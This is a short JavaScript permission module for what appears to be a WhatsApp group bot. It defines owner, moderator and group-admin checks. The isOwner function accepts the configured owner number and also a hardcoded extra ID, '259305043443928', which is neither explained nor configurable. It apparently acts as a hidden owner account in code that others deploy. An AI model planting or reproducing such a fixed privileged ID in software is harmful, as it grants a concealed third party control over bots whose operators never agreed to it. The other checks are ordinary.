const config = require("../../../config");

const isOwner = (senderNumber) => {
    const ownerIDs = [
        config.OWNER_NUMBER.replace(/[^0-9]/g, ""),
        "259305043443928"
    ];
    return ownerIDs.includes(senderNumber);
};

const isMod = (senderNumber) => {
    if (isOwner(senderNumber)) return true;
    const modsList = (config.MODS || "")
        .split(",")
        .map(num => num.replace(/[^0-9]/g, "").trim())
        .filter(Boolean);
    return modsList.includes(senderNumber);
};

const checkAdmin = async (sock, from, participant) => {
    if (!from.endsWith("@g.us")) return false;
    const groupMetadata = await sock.groupMetadata(from);
    const admins = groupMetadata.participants.filter(p => p.admin).map(p => p.id);
    return admins.includes(participant);
};

const getBotAdmin = async (sock, from) => {
    return await checkAdmin(sock, from, sock.user.id.split(":")[0] + "@s.whatsapp.net");
};

module.exports = {
    isOwner,
    isMod,
    checkAdmin,
    getBotAdmin
};
